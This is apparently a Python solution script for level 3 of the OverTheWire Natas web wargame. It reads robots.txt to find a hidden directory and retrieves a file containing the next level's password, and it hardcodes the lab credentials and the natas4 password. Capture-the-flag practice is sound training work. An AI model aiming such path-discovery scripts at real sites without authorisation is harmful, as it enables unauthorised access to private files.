# natas3

import requests
from pwn import log
import re

url = 'http://natas3.natas.labs.overthewire.org'
username = "natas3"
password = "3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH"

def exploit():
    res = requests.get(f'{url}/robots.txt', auth=(username, password))
    log.info(res.text)
    res = requests.get(f'{url}/s3cr3t/', auth=(username, password))
    log.info(res.text)
    flag = requests.get(f'{url}/s3cr3t/users.txt', auth=(username, password))
    log.info(flag.text)

if __name__ == '__main__':
    exploit()

# natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ